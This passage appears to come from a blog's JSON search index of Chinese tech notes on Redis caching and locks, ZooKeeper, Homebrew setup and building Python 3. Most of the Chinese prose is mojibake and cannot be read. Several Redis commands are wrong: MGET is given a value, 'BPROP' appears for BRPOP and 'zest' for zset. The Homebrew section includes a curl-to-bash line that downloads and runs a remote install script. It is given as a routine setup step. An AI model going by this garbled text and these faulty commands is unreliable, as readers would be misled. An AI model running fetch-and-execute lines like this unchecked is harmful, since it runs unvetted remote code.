è‡³ä¸ä¸»æœåŠ¡å™¨æ‰§è¡ŒBGSAVEå‘½ä»¤æ—¶çš„çŠ¶æ€ã€‚\n+ ä¸»æœåŠ¡å™¨å°†æ‰€æœ‰ç¼“å†²åŒºçš„å†™å‘½ä»¤å‘é€ç»™ä»æœåŠ¡å™¨ï¼Œä»æœåŠ¡å™¨æ‰§è¡Œè¿™äº›å†™å‘½ä»¤ï¼Œè¾¾åˆ°æ•°æ®æœ€ç»ˆä¸€è‡´æ€§ã€‚\n\n##### éƒ¨åˆ†é‡åŒæ­¥\n\nå¤åˆ¶åç§»é‡ï¼šæ‰§è¡Œå¤åˆ¶çš„åŒæ–¹éƒ½ä¼šåˆ†åˆ«ç»´æŠ¤ä¸€ä¸ªå¤åˆ¶åç§»é‡\nä¸»æœåŠ¡å™¨æ¯æ¬¡ä¼ æ’­Nä¸ªå­—èŠ‚ï¼Œå°±å°†è‡ªå·±çš„å¤åˆ¶åç§»é‡åŠ ä¸ŠN\nä»æœåŠ¡å™¨æ¯æ¬¡æ”¶åˆ°ä¸»æœåŠ¡å™¨çš„Nä¸ªå­—èŠ‚ï¼Œå°±å°†è‡ªå·±çš„å¤åˆ¶åç§»é‡åŠ ä¸ŠN\né€šè¿‡å¯¹æ¯”ä¸»ä»å¤åˆ¶çš„åç§»é‡ï¼Œå°±å¾ˆå®¹æ˜“çŸ¥é“ä¸»ä»æœåŠ¡å™¨çš„æ•°æ®æ˜¯å¦å¤„äºä¸€è‡´æ€§çš„çŠ¶æ€ï¼\n\n//TODO:\n\n\n\n# 7. Redis å…¶ä»–é—®é¢˜\n\n### 7.1 ç¼“å­˜é›ªå´©\n\n+ Redis æŒ‚æ‰äº†ï¼Œè¯·æ±‚å…¨éƒ¨èµ°æ•°æ®åº“ã€‚\n+ å¯¹ç¼“å­˜æ•°æ®è®¾ç½®ç›¸åŒçš„è¿‡æœŸæ—¶é—´ï¼Œå¯¼è‡´æŸæ®µæ—¶é—´å†…ç¼“å­˜å¤±æ•ˆï¼Œè¯·æ±‚å…¨éƒ¨èµ°æ•°æ®åº“ã€‚\n+ ç¼“å­˜é›ªå´©å¦‚æœå‘ç”Ÿäº†ï¼Œå¾ˆå¯èƒ½å°±æŠŠæˆ‘ä»¬çš„æ•°æ®åº“æå®ï¼Œå¯¼è‡´æ•´ä¸ªæœåŠ¡ç˜«ç—ªï¼\n\n\nå¦‚ä½•è§£å†³ç¼“å­˜é›ªå´©ï¼Ÿ\n\n+ åœ¨ç¼“å­˜çš„æ—¶å€™ç»™è¿‡æœŸæ—¶é—´åŠ ä¸Šä¸€ä¸ªéšæœºå€¼ï¼Œè¿™æ ·å°±ä¼šå¤§å¹…åº¦çš„å‡å°‘ç¼“å­˜åœ¨åŒä¸€æ—¶é—´è¿‡æœŸã€‚\n\n+ å®ç° Redis çš„é«˜å¯ç”¨ (ä¸»ä»æ¶æ„ + Sentinel æˆ–è€… Redis Cluster)ï¼Œå°½é‡é¿å… Redis æŒ‚æ‰è¿™ç§æƒ…å†µå‘ç”Ÿã€‚\n+ ä¸‡ä¸€ Redis çœŸçš„æŒ‚äº†ï¼Œæˆ‘ä»¬å¯ä»¥è®¾ç½®æœ¬åœ°ç¼“å­˜ (ehcache)+ é™æµ (hystrix)ï¼Œå°½é‡é¿å…æˆ‘ä»¬çš„æ•°æ®åº“è¢«å¹²æ‰ (èµ·ç èƒ½ä¿è¯æˆ‘ä»¬çš„æœåŠ¡è¿˜æ˜¯èƒ½æ­£å¸¸å·¥ä½œçš„)\n+ redis æŒä¹…åŒ–ï¼Œé‡å¯åè‡ªåŠ¨ä»ç£ç›˜ä¸ŠåŠ è½½æ•°æ®ï¼Œå¿«é€Ÿæ¢å¤ç¼“å­˜æ•°æ®ã€‚\n\n### 7.2 ç¼“å­˜ç©¿é€\n\nç¼“å­˜ç©¿é€æ˜¯æŒ‡æŸ¥è¯¢ä¸€ä¸ªä¸€å®šä¸å­˜åœ¨çš„æ•°æ®ã€‚ç”±äºç¼“å­˜ä¸å‘½ä¸­ï¼Œå¹¶ä¸”å‡ºäºå®¹é”™è€ƒè™‘ï¼Œå¦‚æœä»æ•°æ®åº“æŸ¥ä¸åˆ°æ•°æ®åˆ™ä¸å†™å…¥ç¼“å­˜ï¼Œè¿™å°†å¯¼è‡´è¿™ä¸ªä¸å­˜åœ¨çš„æ•°æ®æ¯æ¬¡è¯·æ±‚éƒ½è¦åˆ°æ•°æ®åº“å»æŸ¥è¯¢ï¼Œå¤±å»äº†ç¼“å­˜çš„æ„ä¹‰ã€‚\n\n\nè§£å†³ç¼“å­˜ç©¿é€ä¹Ÿæœ‰ä¸¤ç§æ–¹æ¡ˆï¼š\n\n+ ç”±äºè¯·æ±‚çš„å‚æ•°æ˜¯ä¸åˆæ³•çš„(æ¯æ¬¡éƒ½è¯·æ±‚ä¸å­˜åœ¨çš„å‚æ•°)ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¸ƒéš†è¿‡æ»¤å™¨(BloomFilter)æˆ–è€…å‹ç¼©filteræå‰æ‹¦æˆªï¼Œä¸åˆæ³•å°±ä¸è®©è¿™ä¸ªè¯·æ±‚åˆ°æ•°æ®åº“å±‚ï¼\n\n  + å¦‚ä½•åœ¨æµ·é‡å…ƒç´ ä¸­(10äº¿,ä¸å®šé•¿,ä¸é‡å¤) å¿«é€Ÿåˆ¤æ–­ä¸€ä¸ªå…ƒç´ æ˜¯å¦å­˜åœ¨?\n\n    å¸ƒéš†: å¤šä¸ª hash å‡½æ•°, å¯¹åº”å¤šä¸ª bit\n\n    å¸ƒéš†åˆ¤æ–­å­˜åœ¨, æœ‰å¯èƒ½æ˜¯é”™çš„(åˆ«äººçš„ hash ç¢°æ’), å‘Šè¯‰æˆ‘ä¸å­˜åœ¨, å°±ä¸€å®šä¸å­˜åœ¨, å…ˆå»å¸ƒéš†è¿‡æ»¤å™¨æŸ¥è¯¢, å†å» redis\n\n+ å½“æˆ‘ä»¬ä»æ•°æ®åº“æ‰¾ä¸åˆ°çš„æ—¶å€™ï¼Œæˆ‘ä»¬ä¹Ÿå°†è¿™ä¸ªç©ºå¯¹è±¡è®¾ç½®åˆ°ç¼“å­˜é‡Œè¾¹å»ã€‚ä¸‹æ¬¡å†è¯·æ±‚çš„æ—¶å€™ï¼Œå°±å¯ä»¥ä»ç¼“å­˜é‡Œè¾¹è·å–äº†ã€‚\n  è¿™ç§æƒ…å†µæˆ‘ä»¬ä¸€èˆ¬ä¼šå°†ç©ºå¯¹è±¡è®¾ç½®ä¸€ä¸ªè¾ƒçŸ­çš„è¿‡æœŸæ—¶é—´ã€‚\n\n\n\n### 7.3 ç¼“å­˜ä¸æ•°æ®åº“åŒå†™ä¸€è‡´\n\n##### 7.3.1 ä¸€èˆ¬æ¥è¯´ï¼Œæ‰§è¡Œæ›´æ–°æ“ä½œæ—¶ï¼Œæˆ‘ä»¬ä¼šæœ‰ä¸¤ç§é€‰æ‹©ï¼š\n\n+ å…ˆæ“ä½œæ•°æ®åº“ï¼Œå†æ“ä½œç¼“å­˜\n+ å…ˆæ“ä½œç¼“å­˜ï¼Œå†æ“ä½œæ•°æ®åº“\n\n\n\n##### 7.3.2 æ“ä½œç¼“å­˜ä¹Ÿæœ‰ä¸¤ç§æ–¹æ¡ˆï¼š\n\n- æ›´æ–°ç¼“å­˜\n- åˆ é™¤ç¼“å­˜\n\nä¸€èˆ¬æˆ‘ä»¬éƒ½æ˜¯é‡‡å–åˆ é™¤ç¼“å­˜ç¼“å­˜ç­–ç•¥çš„ï¼ŒåŸå› å¦‚ä¸‹ï¼š\n\n1ï¼Œ é«˜å¹¶å‘ç¯å¢ƒä¸‹ï¼Œæ— è®ºæ˜¯å…ˆæ“ä½œæ•°æ®åº“è¿˜æ˜¯åæ“ä½œæ•°æ®åº“è€Œè¨€ï¼Œå¦‚æœåŠ ä¸Šæ›´æ–°ç¼“å­˜ï¼Œé‚£å°±æ›´åŠ å®¹æ˜“å¯¼è‡´æ•°æ®åº“ä¸ç¼“å­˜æ•°æ®ä¸ä¸€è‡´é—®é¢˜ã€‚(åˆ é™¤ç¼“å­˜ç›´æ¥å’Œç®€å•å¾ˆå¤š)\n\n2ï¼Œ å¦‚æœæ¯æ¬¡æ›´æ–°äº†æ•°æ®åº“ï¼Œéƒ½è¦æ›´æ–°ç¼“å­˜ã€è¿™é‡ŒæŒ‡çš„æ˜¯é¢‘ç¹æ›´æ–°çš„åœºæ™¯ï¼Œè¿™ä¼šè€—è´¹ä¸€å®šçš„æ€§èƒ½ã€‘ï¼Œå€’ä¸å¦‚ç›´æ¥åˆ é™¤æ‰ã€‚ç­‰å†æ¬¡è¯»å–æ—¶ï¼Œç¼“å­˜é‡Œæ²¡æœ‰ï¼Œé‚£æˆ‘åˆ°æ•°æ®åº“æ‰¾ï¼Œåœ¨æ•°æ®åº“æ‰¾åˆ°å†å†™åˆ°ç¼“å­˜é‡Œè¾¹(ä½“ç°æ‡’åŠ è½½)\n\nåŸºäºè¿™ä¸¤ç‚¹ï¼Œå¯¹äºç¼“å­˜åœ¨æ›´æ–°æ—¶è€Œè¨€ï¼Œéƒ½æ˜¯å»ºè®®æ‰§è¡Œåˆ é™¤æ“ä½œï¼\n\n\n\n##### 7.3.3 å…ˆæ›´æ–°æ•°æ®åº“ï¼Œå†åˆ é™¤ç¼“å­˜\n\nåœ¨é«˜å¹¶å‘ä¸‹è¡¨ç°ä¸å¦‚æ„ï¼Œåœ¨åŸå­æ€§è¢«ç ´åæ—¶è¡¨ç°ä¼˜å¼‚\n\n- ç¬¬ä¸€æ­¥æˆåŠŸ(æ“ä½œæ•°æ®åº“)ï¼Œç¬¬äºŒæ­¥å¤±è´¥(åˆ é™¤ç¼“å­˜)ï¼Œä¼šå¯¼è‡´**æ•°æ®åº“é‡Œæ˜¯æ–°æ•°æ®ï¼Œè€Œç¼“å­˜é‡Œæ˜¯æ—§æ•°æ®**ã€‚\n- å¦‚æœç¬¬ä¸€æ­¥(æ“ä½œæ•°æ®åº“)å°±å¤±è´¥äº†ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥è¿”å›é”™è¯¯(Exception)ï¼Œä¸ä¼šå‡ºç°æ•°æ®ä¸ä¸€è‡´ã€‚\n\n\n\n##### 7.3.4 å…ˆåˆ é™¤ç¼“å­˜ï¼Œå†æ›´æ–°æ•°æ®åº“\n\nåœ¨é«˜å¹¶å‘ä¸‹è¡¨ç°ä¸å¦‚æ„ï¼Œåœ¨åŸå­æ€§è¢«ç ´åæ—¶è¡¨ç°ä¼˜å¼‚\n\n- ç¬¬ä¸€æ­¥æˆåŠŸ(åˆ é™¤ç¼“å­˜)ï¼Œç¬¬äºŒæ­¥å¤±è´¥(æ›´æ–°æ•°æ®åº“)ï¼Œæ•°æ®åº“å’Œç¼“å­˜çš„æ•°æ®è¿˜æ˜¯ä¸€è‡´çš„ã€‚\n- å¦‚æœç¬¬ä¸€æ­¥(åˆ é™¤ç¼“å­˜)å°±å¤±è´¥äº†ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥è¿”å›é”™è¯¯(Exception)ï¼Œæ•°æ®åº“å’Œç¼“å­˜çš„æ•°æ®è¿˜æ˜¯ä¸€è‡´çš„ã€‚\n\n\n\n# 8. é—®é¢˜æ€»ç»“\n\n### 8.1 stringç”¨æ³•\n\n+ æ•°æ®åº“è¡¨è½¬æ¢æˆ redis ç»“æ„, id æ˜¯ä¸»é”®\n\n  MSET user::{ID}::name liuwei\n\n  MGET user::{ID}::age 18\n\n+ åšé˜…è¯»è®¡æ•°å™¨\n\n  + incr readcount::{å¸–å­ ID}\n  + get readcount::{å¸–å­ ID} \n\n+ åˆ†å¸ƒå¼é”çš„æ€è·¯\n\n  + setnx+expireå‘½ä»¤ (é”™è¯¯çš„åšæ³•)\n\n    setnxå’Œexpireæ˜¯åˆ†å¼€çš„ä¸¤æ­¥æ“ä½œï¼Œä¸å…·æœ‰åŸå­æ€§ï¼Œå¦‚æœæ‰§è¡Œå®Œç¬¬ä¸€æ¡æŒ‡ä»¤åº”ç”¨å¼‚å¸¸æˆ–è€…é‡å¯äº†ï¼Œé”å°†æ— æ³•è¿‡æœŸã€‚\n\n  ```shell\n  SETNX(\"lock\", 1) == 1 #æˆåŠŸè·å¾—é”\n  SETNX(\"lock\", 1) == 0 #æœ‰äººå ç”¨èµ„æºè·å–å¤±è´¥\n  \n  DEL(\"lock\") #é‡Šæ”¾é”\n  PEXPIRE(\"lock\",1000)#è®¾ç½®ä¸ªè¿‡æœŸæ—¶é—´,é˜²æ­¢æ— æ³•é‡Šæ”¾é”\n  ```\n\n  + ä½¿ç”¨ set key value [EX seconds][PX milliseconds][NX|XX] å‘½ä»¤ (æ­£ç¡®åšæ³•)\n\n    ```\n    SET key value[EX seconds][PX milliseconds][NX|XX]\n    ```\n\n    - EX seconds: è®¾å®šè¿‡æœŸæ—¶é—´ï¼Œå•ä½ä¸ºç§’\n    - PX milliseconds: è®¾å®šè¿‡æœŸæ—¶é—´ï¼Œå•ä½ä¸ºæ¯«ç§’\n    - NX: ä»…å½“keyä¸å­˜åœ¨æ—¶è®¾ç½®å€¼\n    - XX: ä»…å½“keyå­˜åœ¨æ—¶è®¾ç½®å€¼\n\n    setå‘½ä»¤çš„nxé€‰é¡¹ï¼Œå°±ç­‰åŒäºsetnxå‘½ä»¤ï¼Œä»£ç è¿‡ç¨‹å¦‚ä¸‹ï¼š\n\n    ```\n    public boolean tryLock_with_set(String key, String UniqueId, int seconds) {\n        return \"OK\".equals(jedis.set(key, UniqueId, \"NX\", \"EX\", seconds));\n    }\n    ```\n\n    valueå¿…é¡»è¦å…·æœ‰å”¯ä¸€æ€§ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨UUIDæ¥åšï¼Œæ‰€ä»¥é€šå¸¸æ¥è¯´ï¼Œåœ¨é‡Šæ”¾é”æ—¶ï¼Œæˆ‘ä»¬éœ€è¦å¯¹valueè¿›è¡ŒéªŒè¯\n\n\n\n\n### 8.2 hash ç”¨æ³•\n\n+ æ•°æ®åº“è¡¨è½¬æ¢æˆ redis ç»“æ„, id æ˜¯ä¸»é”®\n\n  HMSET teacher 1::name levon 1::age 18\n\n  HMGET teacher 1::name 1::age\n\n### 8.3 list ç”¨æ³•\n\n+ å®ç°é˜»å¡æ¶ˆæ¯é˜Ÿåˆ—\n\n  LPUSH <=> BPROP\n\n### 8.4 set ç”¨æ³•\n\n+ æ— åº, å»é‡\n+ å¾®åšå…³æ³¨å…³ç³»\n\n### 8.5 zset ç”¨æ³•\n\n+ æ’è¡Œæ¦œ\n\n+ zest ç›¸åŒ score æ€ä¹ˆåŠ?\n\n  é»˜è®¤å­—å…¸æ’åº\n\n\n\n# 9. redis pipeline\n\n+ redisçš„ç®¡é“å‘½ä»¤ï¼Œå…è®¸clientå°†å¤šä¸ªè¯·æ±‚ä¾æ¬¡å‘ç»™æœåŠ¡å™¨ï¼Œè¿‡ç¨‹ä¸­è€Œä¸éœ€è¦ç­‰å¾…è¯·æ±‚çš„å›å¤ï¼Œåœ¨æœ€åå†ä¸€å¹¶è¯»å–ç»“æœå³å¯ã€‚\n\n+ pipelineä¸ä¿è¯åŸå­æ€§\n\n```go\npackage main\n\nimport (\n    \"github.com/go-redis/redis\"\n    \"fmt\"\n)\n\nfunc main() {\n    client := redis.NewClusterClient(&redis.ClusterOptions{\n        Addrs: []string{\"192.168.120.110:6379\"},\n        ReadOnly: true,\n        RouteRandomly: true,\n    })\n\n    pipe := client.Pipeline()\n    pipe.HGetAll(\"1\")\n    pipe.HGetAll(\"2\")\n    pipe.HGetAll(\"3\")\n    cmders, err := pipe.Exec()\n    if err != nil {\n        fmt.Println(\"err\", err)\n    }\n    for _, cmder := range cmders {\n        cmd := cmder.(*redis.StringStringMapCmd)\n        strMap, err := cmd.Result()\n        if err != nil {\n            fmt.Println(\"err\", err)\n        }\n        fmt.Println(\"strMap\", strMap)\n    }\n}\n```\n\n\n\n# 10. å‚è€ƒèµ„æ–™\n\n+ https://github.com/ZhongFuCheng3y/3y#tvredis\n\n","tags":["redis"],"categories":["sql"]},{"title":"zookeeperä»‹ç»å’Œä½¿ç”¨","url":"%2Fp%2F7c519e18.html","content":"\n\n# 1. åˆ†å¸ƒå¼åº”ç”¨\n\n### 1.1 ä¸€è‡´æ€§\n\nå¼ºä¸€è‡´æ€§\n\nå¼±ä¸€è‡´æ€§\n\næœ€ç»ˆä¸€è‡´æ€§\n\n<!-- more -->\n\n### 1.2 é€‰ä¸¾Leader\n\nå…ˆçœ‹ zid (å†™çš„ä¸€ä¸ªæ—¥å¿— id),  å†çœ‹ myid\n\né€‰å– Leader æ—¶é—´èŠ‚ç‚¹\n\n+ æœåŠ¡åˆšå¯åŠ¨\n\n+ leader æŒ‚äº†\n\n+ è¶…è¿‡ä¸€åŠçš„èŠ‚ç‚¹æŒ‚äº†ï¼Œ leader shutdown\n\n### 1.3 åŒæ­¥æ“ä½œ\n\nleader è´Ÿè´£å†™\n\nfollower è½¬å‘ç»™ leader å†™\n\n+ leader ç”Ÿæˆæ—¥å¿—ï¼Œå‘ç»™æ‰€æœ‰ follower\n\n+ follewer æŒä¹…åŒ–æ—¥å¿—ï¼Œ å›å¤ ack\n\n+ leader æ¥æ”¶è¶…è¿‡ä¸€åŠ ack, å‘é€commit,  æ›´æ–° database\n\n+ folleweræ”¶åˆ° commit, æ›´æ–° database\n\n\n\n# 2. zookeeper\n\n### 2.1 znode\n\n+ path å”¯ä¸€è·¯å¾„\n\n+ data æ•°æ®, å¯ä»¥æ²¡æœ‰\n\n+ childNode å­èŠ‚ç‚¹\n\n+ stat çŠ¶æ€å±æ€§\n\n+ type èŠ‚ç‚¹ç±»å‹\n\n  + æŒä¹…èŠ‚ç‚¹ï¼ˆé™¤éæ‰‹åŠ¨åˆ é™¤ï¼ŒèŠ‚ç‚¹æ°¸è¿œå­˜åœ¨, é»˜è®¤çš„ï¼‰\n  + æŒä¹…æœ‰åºèŠ‚ç‚¹ï¼ˆæŒ‰ç…§åˆ›å»ºé¡ºåºä¼šä¸ºæ¯ä¸ªèŠ‚ç‚¹æœ«å°¾å¸¦ä¸Šä¸€ä¸ªåºå·å¦‚ï¼šroot-1ï¼‰\n  + ä¸´æ—¶èŠ‚ç‚¹ï¼ˆåˆ›å»ºå®¢æˆ·ç«¯ä¸ Zookeeper ä¿æŒè¿æ¥æ—¶èŠ‚ç‚¹å­˜åœ¨ï¼Œæ–­å¼€æ—¶åˆ™åˆ é™¤å¹¶ä¼šæœ‰ç›¸åº”çš„é€šçŸ¥ï¼‰\n    + ä¸èƒ½æ‹¥æœ‰å­èŠ‚ç‚¹\n    + æœåŠ¡æ³¨å†Œ\n    + åˆ†å¸ƒå¼é”\n  + ä¸´æ—¶æœ‰åºèŠ‚ç‚¹ï¼ˆåœ¨ç¬æ—¶èŠ‚ç‚¹çš„åŸºç¡€ä¸ŠåŠ ä¸Šäº†é¡ºåºï¼‰\n\n  \n\n# 3. å®‰è£…å’Œä½¿ç”¨\n\n### 3.1 å®‰è£…\n\n```bash\nbrew install zookeeper\n```\n\nå®‰è£…å®Œæˆï¼Œé…ç½®æ–‡ä»¶åœ¨ `/usr/local/etc/zookeeper/` \n\n### 3.2 ä½¿ç”¨\n\n```bash\nzkServer start #å¯åŠ¨ zookeeper\nzkCli # è¿æ¥ zookeeper\n\nls /\ncreate /apps \"test\"\nget -s /apps\n\ncreate -s # åºå·\ncreate -e # ä¸´æ—¶\n```\n\n\n\n# 4. åˆ†å¸ƒå¼é”\né€šè¿‡ä¸´æ—¶å’Œåºå·çš„åŸç†\n+ åˆ›å»ºä¸´æ—¶åºå·èŠ‚ç‚¹\n+ è·å–æœ€å°çš„èŠ‚ç‚¹æ˜¯å¦æ—¶è¯»é”, å¦‚æœæ˜¯è¯», é‚£ä¹ˆè·å¾—é”\n+ å¦‚æœä¸æ˜¯, é˜»å¡ç­‰å¾…, æ·»åŠ å­èŠ‚ç‚¹å˜æ›´ç›‘å¬(å¯ä»¥æ”¹è¿›é“¾è¡¨, ç›‘å¬å®ƒçš„ä¸Šä¸€ä¸ªèŠ‚ç‚¹)\n\n\n\n# 5. æœåŠ¡æ³¨å†Œå’Œå‘ç°\n\n### 5.1 æœåŠ¡æ³¨å†Œ\n\næœåŠ¡æä¾›è€…ï¼ˆProviderï¼‰å¯åŠ¨æ—¶ï¼Œä¼šå‘ZookeeperæœåŠ¡ç«¯æ³¨å†ŒæœåŠ¡ä¿¡æ¯ï¼Œå³ä¼šåœ¨ZookeeperæœåŠ¡å™¨ä¸Šåˆ›å»ºä¸€ä¸ªæœåŠ¡èŠ‚ç‚¹(ä¸´æ—¶èŠ‚ç‚¹)ï¼Œå¹¶åœ¨èŠ‚ç‚¹ä¸Šå­˜å‚¨æœåŠ¡çš„ç›¸å…³æ•°æ®ï¼ˆå¦‚æœåŠ¡æä¾›è€…çš„ipåœ°å€ã€ç«¯å£ç­‰ï¼‰ï¼Œæ¯”å¦‚æ³¨å†Œä¸€ä¸ªç”¨æˆ·æ³¨å†ŒæœåŠ¡ï¼ˆuser/registerï¼‰ã€‚\n\n### 5.2 æœåŠ¡å‘ç°\n\næœåŠ¡æ¶ˆè´¹è€…ï¼ˆConsumerï¼‰å¯åŠ¨æ—¶ï¼Œä¼šæ ¹æ®æœ¬èº«ä¾èµ–çš„æœåŠ¡ä¿¡æ¯ï¼Œå‘ZookeeperæœåŠ¡ç«¯è·å–æ³¨å†Œçš„æœåŠ¡ä¿¡æ¯å¹¶è®¾ç½®Watchï¼Œè·å–åˆ°æ³¨å†Œçš„æœåŠ¡ä¿¡æ¯ä¹‹åå°†æœåŠ¡æä¾›è€…ä¿¡æ¯ç¼“å­˜åœ¨æœ¬åœ°ï¼Œè°ƒç”¨æœåŠ¡æ—¶ç›´æ¥æ ¹æ®ä»Zookeeperæ³¨å†Œä¸­å¿ƒè·å–åˆ°çš„æœåŠ¡æ³¨å†Œä¿¡æ¯è°ƒç”¨æœåŠ¡ï¼Œæ¯”å¦‚å‘ç°ç”¨æˆ·æ³¨å†ŒæœåŠ¡ï¼ˆuser/registerï¼‰å¹¶è°ƒç”¨ã€‚\n\n### 5.3 æœåŠ¡é€šçŸ¥\n\nå½“æœåŠ¡æä¾›è€…å› ä¸ºæŸç§åŸå› å®•æœºæˆ–ä¸æä¾›æœåŠ¡ä¹‹åï¼ŒZookeeperæœåŠ¡æ³¨å†Œä¸­å¿ƒçš„å¯¹åº”æœåŠ¡èŠ‚ç‚¹ä¼šè¢«åˆ é™¤ï¼Œå› ä¸ºæ¶ˆè´¹è€…åœ¨è·å–æœåŠ¡ä¿¡æ¯çš„æ—¶å€™åœ¨å¯¹åº”èŠ‚ç‚¹ä¸Šè®¾ç½®äº†Watchï¼Œå› æ­¤èŠ‚ç‚¹åˆ é™¤ä¹‹åä¼šè§¦å‘å¯¹åº”çš„Watcherï¼ŒZookeeperæ³¨å†Œä¸­å¿ƒä¼šå¼‚æ­¥å‘æœåŠ¡æ‰€å…³è”çš„æ‰€æœ‰æœåŠ¡æ¶ˆè´¹è€…å‘å‡ºèŠ‚ç‚¹åˆ é™¤çš„é€šçŸ¥ï¼ŒæœåŠ¡æ¶ˆè´¹è€…æ ¹æ®æ”¶åˆ°çš„é€šçŸ¥æ›´æ–°ç¼“å­˜çš„æœåŠ¡åˆ—è¡¨ã€‚\n\n### 5.4 æ€»ç»“\n\n+ æ³¨å†Œä½¿ç”¨ä¸´æ—¶èŠ‚ç‚¹, ä¿å­˜ ip å’Œç«¯å£, å°±ç®—æŒ‚äº†èŠ‚ç‚¹ä¹Ÿèƒ½é‡Šæ”¾\n+ æ¶ˆè´¹è€…ç›‘å¬çˆ¶èŠ‚ç‚¹, æœåŠ¡å˜æ¢å°±ä¼šæ”¶åˆ°é€šçŸ¥\n+ æ ¹æ®åˆ—è¡¨ä¸­çš„ä¸€ç³»åˆ—æœåŠ¡, å¯ä»¥éšæœºç®—æ³•å®ç°è°ƒç”¨, ç›¸å½“äºè´Ÿè½½å‡è¡¡","tags":["zookeeper"],"categories":["ä¸­é—´ä»¶"]},{"title":"macçš„homebrewä½¿ç”¨","url":"%2Fp%2Fbe2ea1c8.html","content":"\nHomebrewæ˜¯ä¸€æ¬¾Mac OSå¹³å°ä¸‹çš„è½¯ä»¶åŒ…ç®¡ç†å·¥å…·ï¼Œæ‹¥æœ‰å®‰è£…ã€å¸è½½ã€æ›´æ–°ã€æŸ¥çœ‹ã€æœç´¢ç­‰å¾ˆå¤šå®ç”¨çš„åŠŸèƒ½ã€‚ç®€å•çš„ä¸€æ¡æŒ‡ä»¤ï¼Œå°±å¯ä»¥å®ç°åŒ…ç®¡ç†ï¼Œè€Œä¸ç”¨ä½ å…³å¿ƒå„ç§ä¾èµ–å’Œæ–‡ä»¶è·¯å¾„çš„æƒ…å†µï¼Œååˆ†æ–¹ä¾¿å¿«æ·ã€‚\n\n<!-- more -->\n\nHomebrew ä¼šå°†è½¯ä»¶åŒ…å®‰è£…åˆ°ç‹¬ç«‹ç›®å½•ï¼Œå¹¶å°†å…¶æ–‡ä»¶è½¯é“¾æ¥è‡³ /usr/local ã€‚\n\n```bash\ncd /usr/local\nfind Cellar\nCellar/wget/1.16.1\nCellar/wget/1.16.1/bin/wget\nCellar/wget/1.16.1/share/man/man1/wget.1\n\n$ ls -l bin\nbin/wget -> ../Cellar/wget/1.16.1/bin/wget\n```\n\n\n\n# 1. å®‰è£…ä½¿ç”¨\n\nå»å®˜ç½‘ https://brew.sh/ çœ‹æœ€æ–°ä¸‹è½½ä¿¡æ¯:\n\n```bash\n/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)\"\n```\n\nå¸¸ä½¿ç”¨å‘½ä»¤\n\n```bash\nbrew --version æˆ–è€… brew -v # æ˜¾ç¤ºbrewç‰ˆæœ¬ä¿¡æ¯\n\nbrew list   #æ˜¾ç¤ºæ‰€æœ‰çš„å·²å®‰è£…çš„è½¯ä»¶\nbrew update #è‡ªåŠ¨å‡çº§homebrew\nbrew upgrade  #å‡çº§æ‰€æœ‰å·²è¿‡æ—¶çš„è½¯ä»¶ï¼Œå³åˆ—å‡ºçš„ä»¥è¿‡æ—¶è½¯ä»¶\nbrew upgrade <formula> #å‡çº§æŒ‡å®šçš„è½¯ä»¶\n```\n\n\n\n# 2. æŸ¥çœ‹æºæ›´æ”¹æº\n\nå¯¹äº homebrewï¼Œéœ€è¦æ›¿æ¢çš„æ˜¯4ä¸ªæ¨¡å—çš„é•œåƒ\n\n+ Homebrewï¼ˆbrew --repoï¼‰\n\n+ Homebrew Coreï¼ˆbrew --repo homebrew/coreï¼‰\n\n+ Homebrew Caskï¼ˆbrew --repo homebrew/caskï¼‰\n\n+ Homebrew-bottles\n\næ›¿æ¢: \n\n```bash\n#æ›¿æ¢ Homebrew\ngit -C \"$(brew --repo)\" remote set-url origin https://mirrors.ustc.edu.cn/brew.git\n\n#æ›¿æ¢ Homebrew Core\ngit -C \"$(brew --repo homebrew/core)\" remote set-url origin https://mirrors.ustc.edu.cn/homebrew-core.git\n\n#æ›¿æ¢ Homebrew Cask\ngit -C \"$(brew --repo homebrew/cask)\" remote set-url origin https://mirrors.ustc.edu.cn/homebrew-cask.git\n\n#æ›¿æ¢ Homebrew-bottles\necho 'export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.ustc.edu.cn/homebrew-bottles' >> ~/.zshrc\nsource ~/.zshrc\n\n# æ›´æ–°\nbrew update\n```\n\n\n\n# 3. å‚è€ƒèµ„æ–™\n\n+ https://brew.sh/\n+ https://www.zhihu.com/question/31360766/answer/749386652","tags":["mac"],"categories":["è½¯ä»¶"]},{"title":"linuxæºç å®‰è£…python3","url":"%2Fp%2F95e70f76.html","content":"\n\n\nlinuxä¸‹å¤§éƒ¨åˆ†ç³»ç»Ÿé»˜è®¤è‡ªå¸¦python2.xçš„ç‰ˆæœ¬. é»˜è®¤çš„pythonè¢«ç³»ç»Ÿå¾ˆå¤šç¨‹åºæ‰€ä¾èµ–ï¼Œæ¯”å¦‚centosä¸‹çš„yumå°±æ˜¯python2å†™çš„ï¼Œæ‰€ä»¥é»˜è®¤ç‰ˆæœ¬ä¸è¦è½»æ˜“åˆ é™¤ï¼Œå¦åˆ™ä¼šæœ‰ä¸€äº›é—®é¢˜.\n\nå¦‚æœéœ€è¦ä½¿ç”¨æœ€æ–°çš„Python3é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç¼–è¯‘å®‰è£…æºç åŒ…åˆ°ç‹¬ç«‹ç›®å½•ï¼Œè¿™å’Œç³»ç»Ÿé»˜è®¤ç¯å¢ƒä¹‹é—´æ˜¯æ²¡æœ‰ä»»ä½•å½±å“çš„ï¼Œpython3å’Œpython2ä¸¤ä¸ªç¯å¢ƒå¹¶å­˜å³å¯\n\nä½œä¸ºä½œæ­»å°èƒ½æ‰‹, ä¸è£…æœ€æ–°ç‰ˆæœ¬æ€ä¹ˆèƒ½è¡Œ? æ‰€ä»¥æ‰‹åŠ¨ç¼–è¯‘python3æºç è¿›è¡Œå®‰è£…, å¹¶è®°å½•é‡åˆ°çš„ä¸€äº›é—®é¢˜.\n\n<!-- more -->\n\n\n\n### 1. ä¸‹è½½æºç :\n\nhttps://www.python.org/downloads/source/\n\næ‰¾åˆ°æœ€æ–°çš„Source release ä¸‹è½½å³å¯\n\n\n\n### 2. å®‰è£…å‡†å¤‡å·¥ä½œ:\n\näº‹å®è¯æ˜ä¸‹é¢çš„è¿™äº›è½¯ä»¶ä¸å®‰è£…, åœ¨ç¼–è¯‘python3æ—¶ä¼šå‡ºç°å„ç§é—®é¢˜, 